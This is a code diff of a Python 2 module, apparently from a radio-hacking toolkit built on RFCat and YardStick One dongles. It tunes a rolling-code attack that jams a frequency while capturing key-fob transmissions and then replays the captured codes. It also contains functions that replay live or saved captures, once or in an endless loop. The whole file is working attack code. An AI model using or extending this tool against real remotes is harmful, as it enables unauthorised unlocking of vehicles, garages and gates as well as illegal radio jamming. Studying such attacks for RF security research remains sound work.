@@ -4,31 +4,32 @@ import findDevices, jam
 import time
 
 #-----------------Rolling Code-------------------------#
-def rollingCode(d, frequency, rolling_code=True): 
+def rollingCode(d, frequency, jamming_variance, mdm_rate_jammer, rolling_code, upper_rssi, lower_rssi):
     '''Sets up for a rolling code attack, requires a frequency
     and a RFCat Object'''
+    print frequency+jamming_variance
+    print("ROLLING CODE REQUIRES 2 YardSticks Plugged In")
+    j = jam.setupJammer(1, mdm_rate_jammer)
 
-    print("ROLLING CODE REQUIRES 2 YardSticks Plugged In") 
-    j = jam.setupJammer(1)
-    
-    jam.jamming(j, "start", frequency+70000, rolling_code)
-    roll_captures, signal_strength = tools.capturePayload(d, rolling_code)
+    jam.jamming(j, "start", frequency+jamming_variance, rolling_code)
+    roll_captures, signal_strength = tools.capturePayload(d, rolling_code, upper_rssi, lower_rssi)
     print("Waiting to capture your rolling code transmission")
     print signal_strength
     print roll_captures
 
-    payloads = tools.createBytesFromPayloads(roll_captures) 
+    payloads = tools.createBytesFromPayloads(roll_captures)
 
     time.sleep(1)
-    jam.jamming(j, "stop",frequency+70000, rolling_code)
-    
-    print "Sending First Payload "  
+
+    jam.jamming(j, "stop",frequency+jamming_variance, rolling_code)
+
+    print "Sending First Payload "
     tools.sendTransmission(payloads[0] ,d)
     response = raw_input( "Ready to send second Payload?? (y/n) ")
     if response.lower() == "y":
         tools.sendTransmission(payloads[1] ,d)
 
-    else: 
+    else:
         response = raw_input( "Choose a name to save your file as and press enter: ")
         with open("./files/"+response+".cap", 'w') as file:
             file.write(roll_captures[1])
@@ -37,18 +38,18 @@ def rollingCode(d, frequency, rolling_code=True):
 
 
 #---------------Replay Live Capture----------------------#
-def replayLiveCapture(d, rolling_code): 
-    '''Replays a live capture real time, lets you select your capture 
+def replayLiveCapture(d, rolling_code):
+    '''Replays a live capture real time, lets you select your capture
     and replay it or save it for later'''
 
     replay_capture, signal_strength = tools.capturePayload(d,rolling_code)
     replay_capture = [replay_capture]
-    
+
     response = raw_input( "Replay this capture? (y/n) ")
     if response.lower() == 'y':
-        payloads = tools.createBytesFromPayloads(replay_capture) 
-        for payload in payloads:  
-            print "WAITING TO SEND"  
+        payloads = tools.createBytesFromPayloads(replay_capture)
+        for payload in payloads:
+            print "WAITING TO SEND"
             time.sleep(1)
             tools.sendTransmission(payload ,d)
 
@@ -65,26 +66,22 @@ def replayLiveCapture(d, rolling_code):
 def replaySavedCapture(d, uploaded_payload):
     with open(uploaded_payload) as f:
         payloads = f.readlines()
-        payloads = tools.createBytesFromPayloads(payloads) 
+        payloads = tools.createBytesFromPayloads(payloads)
 
         response = raw_input( "Send once, or forever? (o/f) Default = o ")
 
-        if response.lower() == "f": 
+        if response.lower() == "f":
             print("\nNOTE: TO STOP YOU NEED TO CTRL-Z and Unplug/Plug IN YARDSTICK-ONE\n")
-            while 1: 
-                for payload in payloads:  
-                    print "WAITING TO SEND"  
+            while 1:
+                for payload in payloads:
+                    print "WAITING TO SEND"
                     time.sleep(1)          #You may not want this if you need rapid fire tx
                     tools.sendTransmission(payload ,d)
 
-        else: 
-            for payload in payloads:  
-                    print "WAITING TO SEND"  
+        else:
+            for payload in payloads:
+                    print "WAITING TO SEND"
                     time.sleep(1)
                     tools.sendTransmission(payload ,d)
 
 #--------------- End Replay Saved Capture-------------------#
-    
-
-
-
